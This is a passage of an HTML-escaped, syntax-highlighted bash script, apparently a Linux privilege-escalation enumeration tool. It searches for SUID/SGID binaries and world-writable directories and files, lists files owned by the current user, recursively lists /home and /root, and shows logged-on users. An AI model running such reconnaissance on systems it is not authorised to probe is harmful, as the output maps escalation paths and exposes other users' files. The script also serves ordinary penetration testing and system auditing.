&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/usr/bin/find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; l &lt;span class=&quot;nt&quot;&gt;-maxdepth&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ld&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; World Writable Directories&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/usr/bin/find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-222&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d 2&amp;gt;/dev/null  


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; World Writable FIles&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/usr/bin/find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; 0777 2&amp;gt;/dev/null

&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Files Owned by Current User&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/usr/bin/find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; 2&amp;gt;/dev/null


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; /home and /root Permissions&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
/bin/ls &lt;span class=&quot;nt&quot;&gt;-ahlR&lt;/span&gt; /home/
/bin/ls &lt;span class=&quot;nt&quot;&gt;-ahlR&lt;/span&gt; /root/ 


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;## &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; Logged on Users&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NORMAL&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

/usr/bin/w


&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BLUE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%*s\n'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;COLUMNS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;tput cols&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;##&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$RED&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
